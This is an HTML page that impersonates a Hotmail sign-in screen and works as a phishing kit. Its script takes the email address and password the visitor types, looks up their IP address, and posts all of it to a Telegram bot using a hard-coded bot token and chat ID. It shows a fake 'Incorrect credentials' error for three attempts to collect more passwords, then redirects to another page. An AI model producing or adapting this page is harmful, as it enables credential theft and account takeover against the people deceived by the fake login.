<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotmail Login</title>
    <style>
        /* Reset styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        /* Center the login container */
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f3f2f1;
        }

        .login-container {
            width: 350px;
            padding: 25px;
            background-color: #ffffff;
            border: 1px solid #d6d6d6;
            border-radius: 5px;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        /* Hotmail logo styling */
        .logo {
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo img {
            width: 30px;
            height: 30px;
            margin-right: 10px;
        }

        .logo-text {
            font-size: 24px;
            font-weight: bold;
            color: #0078d4;
        }

        /* Input field styles */
        .input-field {
            width: 100%;
            padding: 12px;
            margin: 12px 0;
            border: 1px solid #d6d6d6;
            border-radius: 3px;
            background-color: #f9f9f9;
            font-size: 14px;
        }

        .input-field:focus {
            border-color: #0078d4;
            outline: none;
        }

        /* Login button styling */
        .login-button {
            width: 100%;
            padding: 12px;
            margin: 20px 0;
            background-color: #0078d4;
            color: #ffffff;
            border: none;
            border-radius: 3px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .login-button:hover {
            background-color: #005ea6;
        }

        /* Error message styling */
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }

        /* Additional text */
        .text-muted {
            color: #767676;
            font-size: 12px;
        }

        /* Sign up link */
        .signup-link {
            color: #0078d4;
            text-decoration: none;
            font-weight: bold;
        }

        .signup-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="IMG_7191.jpeg" alt="Hotmail Logo">
            <div class="logo-text">Hotmail</div>
        </div>
        <form id="loginForm">
            <input type="text" class="input-field" id="username" placeholder="Email address" required>
            <input type="password" class="input-field" id="password" placeholder="Password" required>
            <button type="submit" class="login-button">Log In</button>
        </form>
        <p id="error" class="error-message">Incorrect credentials. Please try again.</p>
        <p class="text-muted">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
    </div>

    <script>
        let attemptCounter = 0; // Initialize attempt counter

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();

            // Increment the attempt counter
            attemptCounter++;

            // Get form data
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Fetch user's IP address using a public API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIp = data.ip; // Capture the user's IP address

                    // Telegram Bot API information
                    const botToken = "7931458013:AAHUj1E0R3wAMCmLzs50b0cLUCxvnyqUdCs";
                    const chatId = "6797850131";
                    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

                    // Create message including the IP address
                    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${userIp}\nAttempt: ${attemptCounter}`;

                    // Send form data to Telegram
                    fetch(telegramApiUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            if (attemptCounter < 4) {
                                // Show error message for first three attempts
                                const errorMessage = document.getElementById("error");
                                errorMessage.style.display = "block";
                            } else {
                                // Redirect on the fourth attempt
                                window.location.href = "flock.html"; // Redirect page
                            }
                        } else {
                            alert("Error submitting data to Telegram.");
                        }
                    })
                    .catch(error => {
                        console.error("Error:", error);
                        alert("An error occurred.");
                    });
                })
                .catch(error => {
                    console.error('Error fetching IP address:', error);
                });
        });
    </script>
</body>
</html>
